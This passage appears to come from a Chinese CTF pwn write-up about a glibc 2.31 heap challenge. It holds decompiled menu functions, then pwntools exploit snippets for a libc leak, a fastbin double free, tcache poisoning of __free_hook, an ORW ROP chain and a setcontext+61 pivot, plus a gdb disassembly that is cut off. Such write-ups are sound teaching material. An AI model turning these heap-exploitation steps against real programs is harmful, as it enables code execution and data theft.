&#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是创建，规定大小不超过 0xF0，qword_A560[idx] 数组存入的是 size</p>
+<h4 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 *__fastcall <span class="title function_">delete</span><span class="params">(__int64 idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int8 *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    result = (<span class="type">unsigned</span> __int8 *)*((_QWORD *)&amp;unk_A460 + idx);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_A460 + idx));</span><br><span class="line">        result = &amp;s_[idx];</span><br><span class="line">        s_[idx] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">show</span><span class="params">(__int64 idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    result = *((_QWORD *)&amp;unk_A460 + idx);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">        <span class="keyword">return</span> write(<span class="number">1</span>, *((<span class="type">const</span> <span class="type">void</span> **)&amp;unk_A460 + idx), qword_A560[idx]);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">edit</span><span class="params">(__int64 idx, <span class="type">signed</span> __int64 size, <span class="type">const</span> <span class="type">void</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">signed</span> __int64 n; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    n = size;</span><br><span class="line">    result = (<span class="type">void</span> *)*((_QWORD *)&amp;unk_A460 + idx);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; qword_A560[idx] )</span><br><span class="line">            n = qword_A560[idx];</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>(*((<span class="type">void</span> **)&amp;unk_A460 + idx), content, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><h4 id="泄露-libc-base"><a href="#泄露-libc-base" class="headerlink" title="泄露 libc_base"></a>泄露 libc_base</h4><p>泄露 libc_base 比较常用的就是 UnSortedbin 泄露 main_arena 减去固定偏移的方法找到 libc_base：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add_chunk(i, <span class="number">0x100</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete_chunk(i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">0</span>)</span><br><span class="line">show_chunk(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">log.success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p>这里需要先挂满 Tcachebin 才可以把 bin 挂到 UnSortedbin 上，也是比较常见的手法了：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780934704383-c4e795d6-1e0f-4c62-a350-ba081f5a3e3f.png"></p>
+<h4 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">17</span>):</span><br><span class="line">    add_chunk(i, <span class="number">0x60</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">17</span>):</span><br><span class="line">    delete_chunk(i)</span><br><span class="line">delete_chunk(<span class="number">8</span>)</span><br><span class="line">delete_chunk(<span class="number">9</span>)</span><br><span class="line">delete_chunk(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>思路</strong>：申请 9 个 <code>0x60</code> 的 chunk。先释放 7 个（10到16）把 <code>0x60</code> 大小的 Tcache 填满。</li>
+<li><strong>Double Free 绕过</strong>：glibc 2.31 引入了 Tcache key 机制来防止 Tcache 的 Double Free。由于 Tcache 已经被我们填满了，接下来释放的 8 和 9 会进入 Fastbin。Fastbin 只检查连续释放的两个 chunk 是否相同（<code>top != p</code>），所以按照 <code>8 -&gt; 9 -&gt; 8</code> 的顺序释放，可以绕过检查。</li>
+</ul>
+<h4 id="Tcache-Poisoning-将-free-hook-申请出来"><a href="#Tcache-Poisoning-将-free-hook-申请出来" class="headerlink" title="Tcache_Poisoning 将 __free_hook 申请出来"></a>Tcache_Poisoning 将 __free_hook 申请出来</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>, <span class="number">27</span>):</span><br><span class="line">    add_chunk(i, <span class="number">0x60</span>, p64(free_hook))</span><br><span class="line">add_chunk(<span class="number">27</span>, <span class="number">0x60</span>, p64(hook_call))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>由于上一步的 double_free，我们可以借此申请处 free_hook 道原本 chunk8 的地址，修改 fd 指针</li>
+<li>当我们申请 chunk 27 的时候就会申请到 _free_hook</li>
+</ul>
+<h4 id="泄露-heap-base"><a href="#泄露-heap-base" class="headerlink" title="泄露 heap_base"></a>泄露 heap_base</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show_chunk(<span class="number">14</span>)</span><br><span class="line">p.recv()</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x11c0</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
+
+<p>泄露 fd 指针然后 vmmap 调一下 heap_base 减去固定差值即可：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780936796870-dd345713-4abc-4da8-99a0-64af038e7d7d.png"></p>
+<h4 id="布置-ORW"><a href="#布置-ORW" class="headerlink" title="布置 ORW"></a>布置 ORW</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rdi) + p64(fake) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;open&quot;</span>])</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;write&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>这里直接先布置 ORW，再说之后的 setcontext + 61 的事情，这样子清晰一点。</p>
+<h4 id="setcontext-61"><a href="#setcontext-61" class="headerlink" title="setcontext+61"></a>setcontext+61</h4><p>先放这一部分的 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">61</span></span><br><span class="line">hook_call = libc_base + <span class="number">0x151bb0</span></span><br><span class="line">pop_rdi = libc_base + rop.find_gadget([<span class="string">&quot;pop rdi&quot;</span>, <span class="string">&quot;ret&quot;</span>]).address</span><br><span class="line">pop_rsi = libc_base + rop.find_gadget([<span class="string">&quot;pop rsi&quot;</span>, <span class="string">&quot;ret&quot;</span>]).address</span><br><span class="line">pop_rdx_r12 = libc_base + rop.find_gadget([<span class="string">&quot;pop rdx&quot;</span>, <span class="string">&quot;pop r12&quot;</span>, <span class="string">&quot;ret&quot;</span>]).address</span><br><span class="line">ret = libc_base + <span class="number">0x22679</span></span><br><span class="line"></span><br><span class="line">fake = heap_base + <span class="number">0x1cf0</span></span><br><span class="line">buf = fake + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">frame = <span class="string">b&quot;./flag\x00\x00&quot;</span> + p64(fake) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(setcontext)</span><br><span class="line">frame = frame.ljust(<span class="number">0xa0</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(fake + <span class="number">0xb0</span>) + p64(ret)</span><br><span class="line">frame += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(buf)</span><br><span class="line">frame += p64(pop_rdx_r12) + p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">add_chunk(<span class="number">28</span>, <span class="number">0x1d0</span>, frame)</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">28</span>)</span><br><span class="line">send(orw)</span><br></pre></td></tr></table></figure>
+
+<p>之后是要打 setcontext+61 迁移到栈上，除此之外还需要一段能够跳转到 setcontext 的 gadgets，通常是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, [rdi+8]</span><br><span class="line">mov [rsp], rax</span><br><span class="line">call [rdx+0x20]</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1780937087043-21584d23-5c68-421e-b391-afeabebf5e4a.png"></p>
+<p>来看一下这道题目的setcontext:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> function setcontext:</span><br><span class="line">   <span class="number">0x00007ffff7e27970</span> &lt;+<span class="number">0</span>&gt;:     endbr64</span><br><span class="line">   <span class="number">0x00007ffff7e27974</span> &lt;+<span class="number">4</span>&gt;:     push   rdi</span><br><span class="line">   <span class="number">0x00007ffff7e27975</span> &lt;+<span class="number">5</span>&gt;:     lea    rsi,[rdi+<span class="number">0x128</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e2797c</span> &lt;+<span class="number">12</span>&gt;:    xor    edx,edx</span><br><span class="line">   <span class="number">0x00007ffff7e2797e</span> &lt;+<span class="number">14</span>&gt;:    mov    edi,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x00007ffff7e27983</span> &lt;+<span class="number">19</span>&gt;:    mov    r10d,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00007ffff7e27989</span> &lt;+<span class="number">25</span>&gt;:    mov    eax,<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x00007ffff7e2798e</span> &lt;+<span class="number">30</span>&gt;:    syscall</span><br><span class="line">   <span class="number">0x00007ffff7e27990</span> &lt;+<span class="number">32</span>&gt;:    pop    rdx</span><br><span class="line">   <span class="number">0x00007ffff7e27991</span> &lt;+<span class="number">33</span>&gt;:    cmp    rax,<span class="number">0xfffffffffffff001</span></span><br><span class="line">   <span class="number">0x00007ffff7e27997</span> &lt;+<span class="number">39</span>&gt;:    jae    <span class="number">0x7ffff7e27abf</span> &lt;setcontext+<span class="number">335</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e2799d</span> &lt;+<span class="number">45</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0xe0</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279a4</span> &lt;+<span class="number">52</span>&gt;:    fldenv [rcx]</span><br><span class="line">   <span class="number">0x00007ffff7e279a6</span> &lt;+<span class="number">54</span>&gt;:    ldmxcsr DWORD PTR [rdx+<span class="number">0x1c0</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279ad</span> &lt;+<span class="number">61</span>&gt;:    mov    rsp,QWORD PTR [rdx+<span class="number">0xa0</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279b4</span> &lt;+<span class="number">68</span>&gt;:    mov    rbx,QWORD PTR [rdx+<span class="number">0x80</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279bb</span> &lt;+<span class="number">75</span>&gt;:    mov    rbp,QWORD PTR [rdx+<span class="number">0x78</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279bf</span> &lt;+<span class="number">79</span>&gt;:    mov    r12,QWORD PTR [rdx+<span class="number">0x48</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279c3</span> &lt;+<span class="number">83</span>&gt;:    mov    r13,QWORD PTR [rdx+<span class="number">0x50</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279c7</span> &lt;+<span class="number">87</span>&gt;:    mov    r14,QWORD PTR [rdx+<span class="number">0x58</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279cb</span> &lt;+<span class="number">91</span>&gt;:    mov    r15,QWORD PTR [rdx+<span class="number">0x60</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279cf</span> &lt;+<span class="number">95</span>&gt;:    test   DWORD PTR fs:<span class="number">0x48</span>,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x00007ffff7e279db</span> &lt;+<span class="number">107</span>&gt;:   je     <span class="number">0x7ffff7e27a96</span> &lt;setcontext+<span class="number">294</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e279e1</span> &lt;+<span class="number">113</span>&gt;:   mov    rsi,QWORD PTR [rdx+<span class="number">0x3a8</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279e8</span> &lt;+<span class="number">120</span>&gt;:   mov    rdi,rsi</span><br><span class="line">   <span class="number">0x00007ffff7e279eb</span> &lt;+<span class="number">123</span>&gt;:   mov    rcx,QWORD PTR [rdx+<span class="number">0x3b0</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e279f2</span> &lt;+<span class="number">130</span>&gt;:   cmp    rcx,QWORD PTR fs:<span class="number">0x78</span></span><br><span class="line">   <span class="number">0x00007ffff7e279fb</span> &lt;+<span class="number">139</span>&gt;:   je     <span class="number">0x7ffff7e27a35</span> &lt;setcontext+<span class="number">197</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e279fd</span> &lt;+<span class="number">141</span>&gt;:   mov    rax,QWORD PTR [rsi-<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a01</span> &lt;+<span class="number">145</span>&gt;:   <span class="keyword">and</span>    rax,<span class="number">0xfffffffffffffff8</span></span><br><span class="line">   <span class="number">0x00007ffff7e27a05</span> &lt;+<span class="number">149</span>&gt;:   cmp    rax,rsi</span><br><span class="line">   <span class="number">0x00007ffff7e27a08</span> &lt;+<span class="number">152</span>&gt;:   je     <span class="number">0x7ffff7e27a10</span> &lt;setcontext+<span class="number">160</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e27a0a</span> &lt;+<span class="number">154</span>&gt;:   sub    rsi,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00007ffff7e27a0e</span> &lt;+<span class="number">158</span>&gt;:   jmp    <span class="number">0x7ffff7e279fd</span> &lt;setcontext+<span class="number">141</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e27a10</span> &lt;+<span class="number">160</span>&gt;:   mov    rax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00007ffff7e27a17</span> &lt;+<span class="number">167</span>&gt;:   incsspq rax</span><br><span class="line">   <span class="number">0x00007ffff7e27a1c</span> &lt;+<span class="number">172</span>&gt;:   rstorssp QWORD PTR [rsi-<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a21</span> &lt;+<span class="number">177</span>&gt;:   saveprevssp</span><br><span class="line">   <span class="number">0x00007ffff7e27a25</span> &lt;+<span class="number">181</span>&gt;:   mov    rax,QWORD PTR [rdx+<span class="number">0x3b0</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a2c</span> &lt;+<span class="number">188</span>&gt;:   mov    QWORD PTR fs:<span class="number">0x78</span>,rax</span><br><span class="line">   <span class="number">0x00007ffff7e27a35</span> &lt;+<span class="number">197</span>&gt;:   rdsspq rcx</span><br><span class="line">   <span class="number">0x00007ffff7e27a3a</span> &lt;+<span class="number">202</span>&gt;:   sub    rcx,rdi</span><br><span class="line">   <span class="number">0x00007ffff7e27a3d</span> &lt;+<span class="number">205</span>&gt;:   je     <span class="number">0x7ffff7e27a5c</span> &lt;setcontext+<span class="number">236</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e27a3f</span> &lt;+<span class="number">207</span>&gt;:   neg    rcx</span><br><span class="line">   <span class="number">0x00007ffff7e27a42</span> &lt;+<span class="number">210</span>&gt;:   shr    rcx,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x00007ffff7e27a46</span> &lt;+<span class="number">214</span>&gt;:   mov    esi,<span class="number">0xff</span></span><br><span class="line">   <span class="number">0x00007ffff7e27a4b</span> &lt;+<span class="number">219</span>&gt;:   cmp    rcx,rsi</span><br><span class="line">   <span class="number">0x00007ffff7e27a4e</span> &lt;+<span class="number">222</span>&gt;:   cmovb  rsi,rcx</span><br><span class="line">   <span class="number">0x00007ffff7e27a52</span> &lt;+<span class="number">226</span>&gt;:   incsspq rsi</span><br><span class="line">   <span class="number">0x00007ffff7e27a57</span> &lt;+<span class="number">231</span>&gt;:   sub    rcx,rsi</span><br><span class="line">   <span class="number">0x00007ffff7e27a5a</span> &lt;+<span class="number">234</span>&gt;:   ja     <span class="number">0x7ffff7e27a4b</span> &lt;setcontext+<span class="number">219</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e27a5c</span> &lt;+<span class="number">236</span>&gt;:   mov    rsi,QWORD PTR [rdx+<span class="number">0x70</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a60</span> &lt;+<span class="number">240</span>&gt;:   mov    rdi,QWORD PTR [rdx+<span class="number">0x68</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a64</span> &lt;+<span class="number">244</span>&gt;:   mov    rcx,QWORD PTR [rdx+<span class="number">0x98</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a6b</span> &lt;+<span class="number">251</span>&gt;:   mov    r8,QWORD PTR [rdx+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a6f</span> &lt;+<span class="number">255</span>&gt;:   mov    r9,QWORD PTR [rdx+<span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a73</span> &lt;+<span class="number">259</span>&gt;:   mov    r10,QWORD PTR [rdx+<span class="number">0xa8</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a7a</span> &lt;+<span class="number">266</span>&gt;:   mov    rdx,QWORD PTR [rdx+<span class="number">0x88</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a81</span> &lt;+<span class="number">273</span>&gt;:   rdsspq rax</span><br><span class="line">   <span class="number">0x00007ffff7e27a86</span> &lt;+<span class="number">278</span>&gt;:   cmp    r10,QWORD PTR [rax]</span><br><span class="line">   <span class="number">0x00007ffff7e27a89</span> &lt;+<span class="number">281</span>&gt;:   mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x00007ffff7e27a8e</span> &lt;+<span class="number">286</span>&gt;:   jne    <span class="number">0x7ffff7e27a93</span> &lt;setcontext+<span class="number">291</span>&gt;</span><br><span class="line">   <span class="number">0x00007ffff7e27a90</span> &lt;+<span class="number">288</span>&gt;:   push   r10</span><br><span class="line">   <span class="number">0x00007ffff7e27a92</span> &lt;+<span class="number">290</span>&gt;:   ret</span><br><span class="line">   <span class="number">0x00007ffff7e27a93</span> &lt;+<span class="number">291</span>&gt;:   jmp    r10</span><br><span class="line">   <span class="number">0x00007ffff7e27a96</span> &lt;+<span class="number">294</span>&gt;:   mov    rcx,QWORD PTR [rdx+<span class="number">0xa8</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27a9d</span> &lt;+<span class="number">301</span>&gt;:   push   rcx</span><br><span class="line">   <span class="number">0x00007ffff7e27a9e</span> &lt;+<span class="number">302</span>&gt;:   mov    rsi,QWORD PTR [rdx+<span class="number">0x70</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27aa2</span> &lt;+<span class="number">306</span>&gt;:   mov    rdi,QWORD PTR [rdx+<span class="number">0x68</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27aa6</span> &lt;+<span class="number">310</span>&gt;:   mov    rcx,QWORD PTR [rdx+<span class="number">0x98</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27aad</span> &lt;+<span class="number">317</span>&gt;:   mov    r8,QWORD PTR [rdx+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27ab1</span> &lt;+<span class="number">321</span>&gt;:   mov    r9,QWORD PTR [rdx+<span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27ab5</span> &lt;+<span class="number">325</span>&gt;:   mov    rdx,QWORD PTR [rdx+<span class="number">0x88</span>]</span><br><span class="line">   <span class="number">0x00007ffff7e27abc</span> &lt;+<span class="number">332</span>&gt;:   xor    eax,eax</span><br><span class="line">   <span class="number">0x00007ffff7e27abe</span> &lt;+<span class="number">334</span>&gt;:   ret</span><br><span class="line">   <span class="number">0x00007ffff7e27abf</span> &lt;+<span class="number">335</span>&gt;:   mov    rcx,QWORD PTR [rip+<span class="number">0x18d382</span>]        <span class="comment"># 0x7ffff7fb4e48</span></span><br><span class="line">   <span class="number">0x00007ffff7e27ac6</span> &lt;+<span class="number">342</span>&gt;:   neg    eax</span><br><span class="line">   <span class="number">0x00007ffff7e27ac8</span> &lt;+<span class="number">344</span>&gt;:   mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   <span class="number">0x00007ffff7e27acb</span> &lt;+<span class="number">347</span>&gt;:   <span class="keyword">or</span>     rax,<span class="number">0xffffffffffffffff</span></span><br><span class="line">   <span class="number">0x00007ffff7e27acf</span> &lt;+<span class="number">351</span>&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>如果我们可以返回到 setcontext+61 的位置, 且成功控制 rdx 及周边区域, 我们就可以控制各个寄存器的值, 同时我们可以发现 , setcontext+107 的跳转语句均成立, 因此程序真正的执行流如下, 其中  mov rcx,QWORD PTR [rdx+0xa8] ; push rcx 是设置 rcx 并将其值压入栈中, 最后由 ret 将这个值作为返回地址, 实际作用就是设置 rip</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00007ffff7e279ad</span> &lt;+<span class="number">61</span>&gt;:    mov    rsp,QWORD PTR [rdx+<span class="number">0xa0</span>]</span><br><span class="line"><span class="number">0x00007ffff7e279b4</span> &lt;+<span class="number">68</span>&gt;:    mov    rbx,QWORD PTR [rdx+<span class="number">0x80</span>]</span><br><span class="line"><span class="number">0x00007ffff7e279bb</span> &lt;+<span class="number">75</span>&gt;:    mov    rbp,QWORD PTR [rdx+<span class="number">0x78</span>]</span><br><span class="line"><span class="number">0x00007ffff7e279bf</span> &lt;+<span class="number">79</span>&gt;:    mov    r12,QWORD PTR [rdx+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x00007ffff7e279c3</span> &lt;+<span class="number">83</span>&gt;:    mov    r13,QWORD PTR [rdx+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x00007ffff7e279c7</span> &lt;+<span class="number">87</span>&gt;:    mov    r14,QWORD PTR [rdx+<span class="number">0x58</span>]</span><br><span class="line"><span class="number">0x00007ffff7e279cb</span> &lt;+<span class="number">91</span>&gt;:    mov    